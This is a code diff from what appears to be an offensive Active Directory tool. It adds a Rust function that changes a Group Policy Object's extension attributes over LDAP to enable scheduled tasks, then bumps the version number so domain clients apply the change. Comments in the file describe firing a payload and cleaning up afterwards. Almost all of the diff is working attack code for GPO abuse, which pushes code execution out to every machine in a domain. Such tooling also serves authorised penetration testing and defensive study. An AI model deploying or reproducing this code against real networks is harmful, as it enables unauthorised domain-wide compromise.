@@ -8,6 +8,7 @@
 //!   5. After payload fires, call `cleanup_gpo_task` to remove the XML
 
 use crate::error::{OverthroneError, Result};
+use crate::proto::ldap::LdapSession;
 use crate::proto::smb::SmbSession;
 use chrono::Utc;
 use uuid::Uuid;
@@ -160,6 +161,131 @@ pub async fn cleanup_gpo_task(
         .map_err(|e| OverthroneError::Smb(format!("GPO cleanup failed: {e}")))?;
 
     Ok(())
+}
+
+// ── GPO LDAP metadata update ────────────────────────────────────────────────
+
+/// Group Policy Preferences CSE GUID blocks required for ScheduledTasks.
+///
+/// Machine and User tiers share the same pair of blocks (sorted order):
+///   `[{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]`
+///   `[{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}{AADCED64-746C-4633-A97C-D61349046527}]`
+const CSE_SCHED_TASKS_BLOCKS: &str = "[{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}{AADCED64-746C-4633-A97C-D61349046527}]";
+
+/// Update `gPCMachineExtensionNames` (or `gPCUserExtensionNames`) on a GPO
+/// to include the ScheduledTasks CSE GUIDs, then bump `versionNumber` to force
+/// Group Policy refresh on domain clients.
+///
+/// `ldap`       — authenticated `LdapSession`  
+/// `gpo_dn`     — full DN of the GPO container, e.g.
+///               `"CN={GUID},CN=Policies,CN=System,DC=corp,DC=local"`  
+/// `is_machine` — `true` → patch `gPCMachineExtensionNames` (machine tier)  
+///               `false` → patch `gPCUserExtensionNames` (user tier)
+pub async fn update_gpc_extension_names(
+    ldap: &mut LdapSession,
+    gpo_dn: &str,
+    is_machine: bool,
+) -> Result<()> {
+    let ext_attr = if is_machine {
+        "gPCMachineExtensionNames"
+    } else {
+        "gPCUserExtensionNames"
+    };
+
+    // ── 1. Read current values ────────────────────────────────────────────────
+    let entries = ldap
+        .custom_search_with_base(
+            gpo_dn,
+            "(objectClass=groupPolicyContainer)",
+            &[ext_attr, "versionNumber"],
+        )
+        .await
+        .map_err(|e| OverthroneError::Ldap {
+            target: gpo_dn.to_string(),
+            reason: format!("Failed to read GPO attributes: {e}"),
+        })?;
+
+    let entry = entries
+        .into_iter()
+        .next()
+        .ok_or_else(|| OverthroneError::Ldap {
+            target: gpo_dn.to_string(),
+            reason: "GPO not found".to_string(),
+        })?;
+
+    let current_ext = entry
+        .attrs
+        .get(ext_attr)
+        .and_then(|v| v.first())
+        .map(String::as_str)
+        .unwrap_or_default();
+
+    let current_version: u32 = entry
+        .attrs
+        .get("versionNumber")
+        .and_then(|v| v.first())
+        .and_then(|s| s.parse().ok())
+        .unwrap_or(0);
+
+    // ── 2. Merge CSE blocks ───────────────────────────────────────────────────
+    let new_ext = merge_cse_blocks(current_ext, CSE_SCHED_TASKS_BLOCKS);
+
+    // ── 3. Write extension names ──────────────────────────────────────────────
+    ldap.modify_replace(gpo_dn, ext_attr, new_ext.as_bytes())
+        .await
+        .map_err(|e| OverthroneError::Ldap {
+            target: gpo_dn.to_string(),
+            reason: format!("Failed to update {ext_attr}: {e}"),
+        })?;
+
+    // ── 4. Bump versionNumber ─────────────────────────────────────────────────
+    // The 32-bit versionNumber splits into: high-16 = machine, low-16 = user.
+    // Increment the appropriate half so domain clients detect the change.
+    let new_version = if is_machine {
+        let m = (current_version >> 16).wrapping_add(1);
+        let u = current_version & 0xFFFF;
+        (m << 16) | u
+    } else {
+        let m = current_version >> 16;
+        let u = (current_version & 0xFFFF).wrapping_add(1);
+        (m << 16) | u
+    };
+    let version_str = new_version.to_string();
+    ldap.modify_replace(gpo_dn, "versionNumber", version_str.as_bytes())
+        .await
+        .map_err(|e| OverthroneError::Ldap {
+            target: gpo_dn.to_string(),
+            reason: format!("Failed to bump versionNumber: {e}"),
+        })?;
+
+    Ok(())
+}
+
+/// Merge CSE block strings — ensure every `[{GUID1}{GUID2}]` token from
+/// `to_add` is present in `current`, returning a sorted merged string.
+fn merge_cse_blocks(current: &str, to_add: &str) -> String {
+    fn parse_blocks(s: &str) -> Vec<String> {
+        let mut blocks = Vec::new();
+        let mut rest = s;
+        while let Some(start) = rest.find('[') {
+            if let Some(rel_end) = rest[start..].find(']') {
+                blocks.push(rest[start..=start + rel_end].to_string());
+                rest = &rest[start + rel_end + 1..];
+            } else {
+                break;
+            }
+        }
+        blocks
+    }
+
+    let mut blocks = parse_blocks(current);
+    for block in parse_blocks(to_add) {
+        if !blocks.contains(&block) {
+            blocks.push(block);
+        }
+    }
+    blocks.sort();
+    blocks.concat()
 }
 
 // ── Private utilities ────────────────────────────────────────────────────────
